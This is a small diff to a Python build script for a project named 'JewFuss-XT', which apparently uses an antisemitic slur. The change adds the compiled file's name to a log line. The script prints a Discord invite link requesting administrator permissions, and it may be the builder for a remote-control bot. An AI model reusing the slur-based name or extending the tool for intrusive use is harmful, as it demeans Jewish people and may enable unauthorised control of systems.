@@ -192,6 +192,6 @@ if os.path.isfile(output_path):
     print(f"\nCompiled JewFuss-XT as {bot_username}")
     print(f"Bot invite link: https://discord.com/oauth2/authorize?client_id={bot_id}&permissions=8&scope=bot")
     with open(log_file_path, 'a') as log_file:
-        log_file.write(f"\"{timestamp}\": {user_input} ({bot_username})\n")
+        log_file.write(f"\"{timestamp}\": {user_input} ({bot_username}) - {os.path.basename(output_path)}\n")
 else:
     print("Error: JewFuss-XT was unable to compile")
